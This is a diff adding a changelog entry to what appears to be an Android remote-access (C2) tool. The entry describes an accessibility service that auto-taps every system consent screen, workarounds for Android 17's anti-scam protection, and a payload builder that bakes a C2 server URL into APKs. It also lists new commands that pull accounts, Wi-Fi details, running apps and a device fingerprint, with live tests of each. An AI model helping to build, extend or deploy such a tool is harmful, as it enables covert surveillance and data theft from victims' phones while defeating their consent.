@@ -5,6 +5,48 @@ here. Version numbers apply to the desktop control panel (`desktop/package.json`
 unless noted; the Android app is installed by `tools/auto_setup.sh` and its
 wire protocol is exercised by `tools/feature_test.sh`.
 
+## [2.1.5] — 2026-08-05
+
+### Added
+- **First-run auto-grant wizard** (`MainActivity`): a sequential setup flow
+  that chains every consent screen — accessibility (optional) → runtime
+  permissions → device admin → notification access → battery optimization →
+  overlay → all-files access → screen-capture consent — and auto-advances
+  when each grant is detected (or after a denial, so onboarding never hangs).
+- **`AutoGrantService`** (accessibility): auto-taps `Allow / Activate / OK /
+  Start now` on every system consent screen, so install-and-run needs **no
+  adb and no PC-side scripts**. Best-effort on Android 14+ (the accessibility
+  toggle itself may need one manual tap; Android 17's anti-scam protection
+  can block it entirely — the wizard skips it and continues).
+- **Desktop payload builder**: `POST /api/build` + a **Payload Builder card**
+  in the dashboard bake a server URL + device id into the APK
+  (`gradle assembleDebug -Pc2Url= -Pc2DeviceId=`) and save a sha256-checked
+  APK under `payloads/`. Gradle `-P` flags now parameterize `BuildConfig`
+  (`SOCKET_URL` + default device id) via `app/build.gradle`; `C2Config` falls
+  back to the baked values before the runtime config file. The builder
+  auto-detects `JAVA_HOME` (no manual env setup on the panel machine).
+- **New data orders**: `x0000deviceInfo` (`dinfo` — model, Android, battery,
+  memory, storage, screen, SIM), `x0000battery`, `x0000accounts`, `x0000runningApps`
+  (`apps-run`), `x0000wifiInfo` (`wifi` — SSID/BSSID/RSSI/link speed/IP),
+  `x0000vibrate` (`buzz <ms>`) — all with dashboard aliases, quick buttons,
+  and readable `.txt` + `.json` capture.
+
+### Fixed
+- **Payload builder now auto-detects `JAVA_HOME`** (`desktop/builder.js`): a
+  plain server process had no JDK in its environment, so `/api/build` failed
+  with "JAVA_HOME is not set". The builder resolves a working JDK
+  (`/opt/android-studio/jbr`, standard JVM paths) and passes it to the gradle
+  spawn — no manual env setup on the panel machine.
+
+### Tested
+- Auto-grant wizard completed its full chain on a fresh Android 17 install
+  (accessibility skipped best-effort; everything else granted and detected).
+- All six new orders answered live on the emulator (`dinfo` full fingerprint,
+  `battery` 100%/25C, `accounts` count, `apps-run` process list, `wifi`
+  SSID/RSSI/IP, `buzz 300` vibrate).
+- Payload builder produced `payload_test-payload_*.apk` (8.9 MB) + `.sha256`.
+- Android unit tests 11/11 pass; desktop protocol suite pass.
+
 ## [2.1.4] — 2026-08-05
 
 ### Fixed
